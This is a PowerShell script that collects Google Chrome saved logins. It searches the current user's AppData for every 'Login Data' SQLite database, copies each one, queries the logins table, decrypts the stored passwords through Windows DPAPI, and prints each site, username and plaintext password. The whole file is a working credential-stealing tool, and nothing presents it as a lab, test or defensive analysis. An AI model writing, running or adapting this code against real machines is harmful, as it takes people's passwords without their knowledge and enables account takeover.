Add-Type -AssemblyName System.Security #connect  DPAPI

$parent_dll = $MyInvocation.MyCommand.Path | Split-Path -Parent
$sqlite_library_path = $parent_dll+"\System.Data.SQLite.dll" #path to dll SQLite
Unblock-File $sqlite_library_path #unblock dll file
[void][System.Reflection.Assembly]::LoadFrom($sqlite_library_path)
$db_query = "SELECT origin_url,action_url,username_value,password_value,signon_realm  FROM logins"

$User=(Get-WMIObject -Class Win32_ComputerSystem).username -replace '.+\\'  #login user
$paths=Get-ChildItem "C:\Users\$USER\AppData" "Login Data" -Recurse #path to "Login Data" file. Default install Google Chrome path C:\Users\Username\AppData\..

function decrypt_password ($enc_pass) {
	$decrypt_char=[System.Security.Cryptography.ProtectedData]::Unprotect($enc_pass.password_value, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
	foreach ($char in $decrypt_char) {
		$password+=[Convert]::ToChar($char)	
	}
	Return $password
}

foreach ($path in $paths) {
	$bak=$path.FullName+'_bak'
	Copy-Item $path.FullName -Destination $bak -Force -Confirm:$false
	$db_data_source = $bak #путь к файлу Login Data
	$db_dataset = New-Object System.Data.DataSet 
	$db_data_adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($db_query,"Data Source=$db_data_source")
	[void]$db_data_adapter.Fill($db_dataset)
	$encrypted_array=$db_dataset.Tables[0] | select signon_realm, username_value, password_value, path_to_file
	foreach ($item in $encrypted_array) {
		$item.password_value=decrypt_password -enc_pass $item
		$item.path_to_file=$db_data_source
	}
	Remove-Item $bak
$encrypted_array | Format-Table -AutoSize signon_realm, username_value, password_value, path_to_file
}
